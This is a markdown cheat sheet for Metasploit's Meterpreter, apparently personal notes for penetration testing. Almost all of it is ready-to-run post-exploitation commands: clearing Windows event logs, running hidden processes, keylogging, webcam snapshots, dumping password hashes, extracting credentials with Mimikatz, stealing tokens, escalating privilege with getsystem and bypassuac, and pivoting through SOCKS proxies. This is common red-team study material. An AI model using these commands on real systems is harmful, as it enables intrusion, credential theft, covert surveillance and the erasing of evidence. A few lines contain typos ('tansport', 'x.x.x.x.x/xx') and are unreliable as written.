# Meterpreter

- Metasploit post exploitation tool

- Works by in memory DLL injection and native shared object format 

- Doesn't touch the disk

- Can

  - command execution

  - in memory process migration

  - Read/Write from the file systom

  - Pivoting

    

## How it works

- Initial stager executed on the target
- Stager loads the DLL prefixed with Reflective. The Reflective stub handles the loading/injection of the DLL
- The meterpreter core initializes
- Establishes a TLS1/0 link and sends a GET
- Metasploit receives the GET and configures the client
- Meterpreter loads extensions over TLS/1.0 using TLV protocol

## Commands 

- Displays help menu:

```
help
```

- sends the session to the background and returns the msf prompt. 

```
background
```

- You recover a session using:

```
sessions -l
sessions -i <session ID>
```


- all work like the unix tools :

```
cat <file>
cd <directory>
pwd
```

- clears the windows event log


```
clearev
```

- Downloads file 

```
download <source> <destination>
```

- Loads a file in VIM and allows you to edit it 

```
edit <filename>
```

- executes a command on the target host 
  - -i allows you to interact with the process after creation
  - -H creates a hidden process
  - -a can be used to pass an argument to the command
  - -t executes the process with the currently impersonated thread token

```
execute -f <command> -i -H
```

- Get the user that you are running as:

```
getuid
```

- delete a file 

```
del <file>
```

- upload a file 

```
upload <source> <destination>
```

- Get systeminfo

```
sysinfo
```

- Kill a process

```
kill <pid>
```

- List running processes

```
ps
```

- To migrate a process

```
ps
migrate <pid>
```

- Get an OS shell

```
shell
```

- Steal an impersonation token

```
steal_token
```

- Run a meterpreter script

```
run <script>
```

- networking commands like on unix

```
ipconfig
route
```

- Configure portforwarding
  - -L local host
  - -l local port
  - -p Remote port
  - -r remote host 

```
portfwd 
```

- search for a file on the target host

```
search -f <filename>
```

- Change transport method to switch protocols, a listener must be set up to recieve new connection

```
tansport list
transport add -t <transport type> -l <local IP> -p <local port>
```

## Post Exploitation

- Load the powershell extension, and run a command, load a script or get a powershell shell

```
load powershell
powershell_execute <command>
powershell_import <powershell script>
powershell_shell 
```

- You can background Meterpreter and use additional metasploit exploits

```
background
use exploit/windows/local/bypassuac
set Session <Session ID of meterpreter>
exploit
```

- Some modules will need other settings like a payload etc

  - take a screenshot

```
screenshot
```

- Initiate a keylogger

```
keyscan_start
keyscan_dump
keyscan_stop
```

- To attempt to gain SYSTEM level privileges

```
use priv
getsystem
```

- display webcams and take a picture

```
webcam_list
webcam_snap
```

- Dump password hashes 

```
run post/windows/gather/hashdump
```

### Mimikatz

- Load Mimikatz

```
load kiwi
```

- List available modules

```
mimikatz_command -f fu::
```

- sekurlsa

```
mimikatz_command -f sekurlsa::searchPasswords
```

- retrieve kerberos credentials 

```
kerberos
```

- retrieve windows MSV

```
msv
```

- Retrieve hashes from SAM

```
mimikatz_command -f samdump::hashes
```

- List crypto_providers

```
mimikatz_command -f crypto::listProviders
```

- Start/stop windows services

```
mimikatz_command -f service::
```

### Incognito

- Impersonating user tokens
- Loading the module

```
use incognito
```

- List user tokens 

```
list_tokens -u 
```

- impersonating a user

```
impersonate_token DOMAIN\\username
```

- Execute command with the token, -t tells it to use the token

```
execute -f cmd.exe -i -t
```

### Pivoting

- autoroute can be used to use ipconfig information to route to any other networks on dual-homed systems

```
run autoroute -s x.x.x.x/24
run autoroute -p
```

- can also use route and add to create a path to the second network subnet

```
route add x.x.x.x.x/xx 11
route print
```

- You can also scan for other systems

```
run arp_scanner -r x.x.x.x/24
```

- scan second network

```
background
use auxiliary/scanner/portscan/tcp
set RHOSTS x.x.x.x/24
set PORTS
run
```

- When targetting hosts in the second network, you must use a bind shell , a reverse shell wouldn't find it's way to the lisener

```
use exploit/whatever/you/need
set payload windows/meterpreter/bind_tcp
```

- Can use a SOCKS proxy to tunnel through the pivot
  - first use the module and use localhost for the proxy
  - Then configure proxychains to use the SOCKS poryx
  - Then use the proxychains command to run an application you want to tunnel

```
use auxiliary/server/socks4a
set SRVHOST 127.0.0.1
exploit -j

echo "socks4 127.0.0.1 8080" >> /etc/proxychains.conf
proxychains <tool> <target IP>
```

- Can portfoward from inside meterpreter

```
portfwd add -l <localport> -p <target port> -r <target IP>
```



## AutoRunScript

- AutoRunScript can run a script once meterpreter is established

```
set AutoRunScript windows/gather/enum_logged_on_users
```

- autoRunScript can also be a custom list of commands
  - autoruncmds.rc